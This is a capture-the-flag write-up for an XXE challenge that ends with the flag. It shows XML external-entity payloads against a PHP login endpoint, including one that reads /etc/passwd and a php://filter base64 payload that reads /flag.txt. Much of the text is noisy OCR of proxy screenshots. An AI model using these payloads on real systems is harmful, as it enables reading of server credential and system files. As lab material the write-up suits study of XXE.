# XEE1
> flag in flag.txt

## About the Challenge
We were given a website that contains a login page


[Image extracted text: Login form
CHECK:
UserName
test
Password
LOGIN]


And if we check the HTTP request and response when entering the username and password


[Image extracted text: Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
POST
[login-php
HTTP / 2
HTTP/ 2
200
OF
Host
6233a0-330e9alf284100062
deadsec
quest
content-
Type:
tert /htnl
charset-ut f-8
User-Agent
Hozilla/ 5
(Vindous
IT
10
Vin64;
{64;
17:109
Gecko/zO1OO101
Dace
Sun ,
2023
10:43: 56
GHT
Firefor/113
Server:
Apache/ - _
4.25
(Debianh
Aecept
applicat
on/*nl
cexc/*ul
"1*;
9-0
X-Povered-By:
PHP / 7
0 . 33
Accept-Language
en-US
en ; 4-0 -
Content-Length:
Accept-Encoding:
gzip,
deflace
Content
Type
applicat
on / *1l
charset-ut f-8
<result>
X-Requested-With: XLHttpRequest
<code
Content
engch:
Origin: https: / /8233402330e9alfc84100062.deadsec
qest
~[eode>
Referer:
https: / /6233a02330e9alfc84100063
deadsec - quest /
<msg>
Sec-
etch-Dest
empty
cest
Sec-Fetch-Hode:
cors
[nsg>
Sec-
etch-Sice
~ =
origin
~/resulc>
Te:
crailers
ruser>
Susernane>
cest
fusernale>
<passvord>
cest
{password>
FLSer?
Hay]



## How to Solve?
At first, Im using a `file` protocol to read `/flag.txt` file


[Image extracted text: Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
POST
/login
php
HTTP / =
HTTP/ 2
200
OK
Host
623320-330e9alf284100063
deadsec
quest
Content
Type
tert /htul
charsetzut f-8
User-Agent
Hozilla/5
(Vindous
IT   10
Vin64;
*64;
rv:109
Gecko/:O1OO101
Dace
Sun
Hay
2023
10:49:26
GHT
Fire
7113
Server
Apache/ =-
(Debianh
Accept
applicat
on/xul
cext/x1l
"1";
X-Povered-By:
PHP / 7 . 0 . 33
Lccept-Language
En
US
en;4-0_
Content
Lencth:
Aecept
Encoding:
szip ,
deflace
Content
Type
application/ xnl
charset-ut f-8
<result>
X-Requesced-Vith:
XIILHttpRequest
~code
Content
Lengch:
156
Origin:
https: / /8233302330e9alfc84100062.deadsec.quest
~fcode>
Referer
https: / /6233a02330e9alf284100063
deadsec
quest /
<nsg>
Sec-Fetch-Dest
empty
You
ca
read
che
flag
Sec--
etch-
Hode:
cors
[msg>
Sec-
etch-Sice
Fun =
origin
~/resulc?
Te;
crailers
I--r1
version=
2--7
IDOCTTPE
replace
EITITT
ent
SYSTEH
file:/ /[flag-exth
ruser
Susernane>
ent
fusernane>
<passvord>
cest
</passvord>
lusery
fox
4F0]


But the output was `You can't read the flag`. Im very confused because my payload was working perfectly if I want to read another file (ex: /etc/passwd)


[Image extracted text: Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
POST
/login-php
HTTP / 2
HTTP/ 2
200
OK
Host
623320-330e9alf284100063
deadsec
quest
Content
Type
tert /htul
charset-ut f-8
User-Agent
Hozilla/5
(Vindous
Vin64;
{64;
rv:109
Gecko/:O1OO101
Date
Sun
Hay
2023
10:49:22
GHT
Firefor/113
Server:
Apache/=
4.25
(Debian)
Accept
applicat
on/xul
cext/x1l
"1";
Vary:
Accept-Encoding
1ccept-
anguage
en-US
en ;
X-Povered-By:
PHP / 7 - 0 _
33
Accept
Encoding:
szip ,
deflace
Content-Length:
993
Content
Type
applicat
on / *1l
charset-ut f-8
X-Requested-Vith: XILHttpRequest
<resulc>
Content
engch:
158
<code>
Origin:
https: / /8233302330e9alfc84100062
deadsec
qest
Re ferer:
https: / /6233a02330e9alf284100063
deadsec
quest /
4code>
Sec-
etch-Dest
empty
<msg>
Sec-
etch-
Hode
cors
oot %:0-O-root:(root
{bin /bash
Sec-
etch-Sice
6 An =
origin
daemon: %:1:1: daehon=
[usr /sbin: /us / sbin/nologin
Te;
crailers
11
bin:%  3:Z bin: /bin: /USr / sbin/nologin
16
12
Sys:%:3:3:sys: /dev: /uS1 /sbin/nologin
I--r1
version=
2--7
13
sync:*: 4:65534:sync: /bin: /bin/sync
IDOCTTPE
replace
EITITT
ent
SYSTEH
file: / / /ete/passud"
14
James:*: 5:60: game
lusr
Jales
{uSr /sbin/no
ogin
<user
15
man:* 6:13
man:
Ivar / cache /man: /uSr / sbin/nologin
susernane
Ip:*: 7: 7: Ip: /var / spool
lpd: /us1 /sbin/nologin
Lent
17
bail
383 8:mail: /var /mail
(USr / sbin/nologin
~fusernale
18
nevs
*:9
:neus: /var/ spoo
Ineus: /usr/sbin/nologin
<passvord>
uucp
x10:10: uucp
Ivar / spool/uucp
(usr / sbin/nologin
cest
proxy:*:13:13-proxy: /bin: /usr /sbin/no_
ogin
</password>
IT
data:*.33:33
TV-data: /var /WUV: /USr / sbin/nologin
USEr?
22
backup
x:34:34:backup
Ivar /backup $
lusr
sbin/no
ogin
lis0 %.38:38
Hailing List Hanager: /varflist: /usr/sbin/nologin
irc:*39
39:ircd: /var/run/ ired: /us1 /sbin/nologin
mats:x: 41:41:Cnats Bug-Reporting Systen
admin)
Ivar/lib/ gat s
fusr / sbin/no_
ogin
nob
dy:*65534:65534
nobody: (noneristent
(usr / sbin/nologin
apt
100:65534
{nonexistent
[bin/ false
onsra:*:1OOO: 1oO0:
[hone
onsra:
Fh& C
<(resulc>
9F0
920]


So I decided to use PHP wrapper to encoded the output with `base64` encoding. Here is the final payload

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/read=convert.base64-encode/resource=/flag.txt"> ]>
<user>
    <username>&ent;</username>
    <password>test</password>
</user>
```


[Image extracted text: Inspector
1 -
X
Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
Selection
36 (0x24)
POST
/login
php
HTTP / 2
HTTP/ 2
200
OF
Host
623320-330e9alf284100063
deadsec-quest
Content
Type
tert /htul
charset-ut f-8
Selected text
User-Agent
Hozilla/5
(Vindous IT
Vin64;
{64;
rv:109
Gecko/:O1OO101
Dace
Sun ,
Hay
2023
10: 53: 09
GHT
Fire
7113
Server:
Apache/ =-
(Debianh
ZGVhZHEuIUIIXZJyHF STRTI fH3p faDIToH
Accept
applicat
on/xul
cext/x1l
"1";
Vary:
Accept-Encoding
30K
Lccept-Language
en-US
en ;
X-Povered-By:
PHP / 7 _
0-33
Aecept
Encoding:
szip
deflace
Concent
ength:
Content
Type
applicat
on / *1l
charset-ut f-8
X-Requested-With: XILHttpRequest
<resulc>
Decoded from:
Base64
Content
Lengch:
198
<code>
Origin:
https:
/8233302330e9alfc84100062.deadsec.quest
dead (nlce
bro
XE3
32_h3h3}
Referer
https:
/6233202330e9alf284100063
deadsec
quest /
4code>
Sec--
etch-Dest
empty
<nsg>
Sec--
etch-
Hode:
cors
ZGVhZHCuIUlX-JYHFSTRTIfHZp faDHoHZOK
Sec-
etch-Sice
6 An =
origin
r0s9>
Te: trailers
</resulc>
Request attributes
I--r1
version=
2--7
<!DOCTYPE replace
EITITT
ent
STSTEH
Request query parameters
'php
(/filter/read-
onvert-base64
encodefresourcez/ flag_
crt
suser>
Request cookies
<usernanez
ent
<fusernane
Request headers
<passtord>
cest
~[passtord>
Response headers
USerZ
Seorcni
matches
Seorcn 
matches
Done
273 bytes | 270 millis
fox
9F0
9-0]


```
dead{n1ce_br0_XE3_3z_h3h3}
```